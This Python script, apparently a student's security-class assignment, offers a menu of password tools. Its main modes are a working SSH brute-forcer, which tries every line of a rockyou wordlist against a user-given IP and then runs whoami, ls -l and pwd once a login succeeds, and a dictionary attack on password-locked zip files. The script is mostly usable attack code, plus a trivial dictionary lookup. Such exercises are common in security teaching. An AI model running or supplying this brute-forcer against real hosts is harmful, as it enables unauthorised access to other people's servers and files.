#!/usr/bin/env python3 
# Script Name:                  Class 18
# Author:                       Zachariah Woodbridge
# Date of latest revision:      31 Jan 2024
# Purpose:                      Adds to Class 16 the capability to authenticate to an SSH server by its IP address.
# Disclaimer:                   This script was written with the assistance of codeium.

# Declaration of imports
import paramiko
import time
import os
import nltk
from nltk.corpus import words
import zipfile

# Declare Functions
def pw_filepath():
    while True:
        filepath = input("Input the complete filepath for the password list (press enter for default /home/rockyou-test.txt): ") or "/home/rockyou-test.txt"
        if os.path.isfile(filepath):
            return filepath
        else:
            print("File not found. Please enter a valid filepath.")

# Download the 'words' dataset from the NLTK library and return the list of words.
def get_words():
   nltk.download('words')
   word_list = words.words()
   return word_list

# Check if a word is in the given list of words.
def check_for_word(word_list):
   user_answer = input("Enter a word: ")
   if user_answer in word_list:
       print(f"{user_answer} is in the dictionary")
   else:
       print(f"{user_answer} is not in the dictionary")

def load_external_file(filepath):
   password_list = []
   with open(filepath, 'r') as file:
       for line in file:
           line = line.strip()  # Remove leading/trailing whitespace
           password_list.append(line)
   return password_list

def defensive(filepath):
    word_list = get_words()  # Download the words dataset
    load_external_file(filepath)  # Load the external file
    check_for_word(word_list)  # Check for a word in the word list

def offensive(filepath):
    # Open the wordlist
    with open(filepath, 'r') as file:
        line = file.readline()
        print(line)
        # Get the next line in the wordlist
        while line:
            # Print the stripped-down line
            line = line.rstrip()
            word = line
            print(word)
            time.sleep(1)
            # Get the next line in the wordlist
            line = file.readline()
        file.close()

def ssh_authentication(filepath):
    # Get user input for host, user, and password
    host = input("Provide IP address to SSH into: ")
    user = input("Input a username: ")
    port = 22
    #  create an object to handle SSH connection
    ssh = paramiko.SSHClient()

    # automatically add the host key
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # try to connect to the host
    try:
        with open(filepath, 'r') as file:
            passwords = [line.strip() for line in file]
            # iterate through the passwords
            for password in passwords:
                try:
                    ssh.connect(host, port, user, password)
                    stdin, stdout, stderr = ssh.exec_command("whoami")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("ls -l")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("pwd")
                    time.sleep(2)
                    output = stdout.read()
                    print(output)
                    print("Successful login using password:", password)
                    break  # Exit loop if successful login
                except paramiko.AuthenticationException:
                    print("Authentication failed using password:", password)
    # catch any errors
    except FileNotFoundError:
        print("File not found. Please check the filepath.")

def unzip_and_test(zip_filepath, wordlist_filepath): # Unzip and test passwords
    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref: # Unzip
        for password in open(wordlist_filepath, 'r'): # Test passwords in wordlist
            password = password.strip() # Remove newline
            try:
                zip_ref.extractall(pwd=password.encode()) # Try password in zip file
                print(f"Password found: {password}") # Print password
                return True
            except Exception as e:
                continue
    print("Password not found in the wordlist.")
    return False

# Main
def main():
    filepath = pw_filepath()
    # Print menu
    print("Select a mode:")
    print("Mode 1: Offensive; Dictionary Iterator")
    print("Mode 2: Defensive; Password Recognized")
    print("Mode 3: Authenticate to SSH Server")
    print("Mode 4: Unzip and Test Passwords")

    mode = input("Enter the mode number (1, 2, 3, or 4): ")

    if mode == "1":
        offensive(filepath)
    elif mode == "2":
        defensive(filepath)
    elif mode == "3":
        ssh_authentication(filepath)
    elif mode == "4":
        zip_filepath = input("Enter the complete filepath for the password-locked zip file: ") # Replace with your zip file path
        success = unzip_and_test(zip_filepath, filepath)
        if success:
            print("Password found!")
        else:
            print("Password not found.")
    else:
        print("Invalid mode selection.")

# Call the main function
if __name__ == "__main__":
    main()

# End
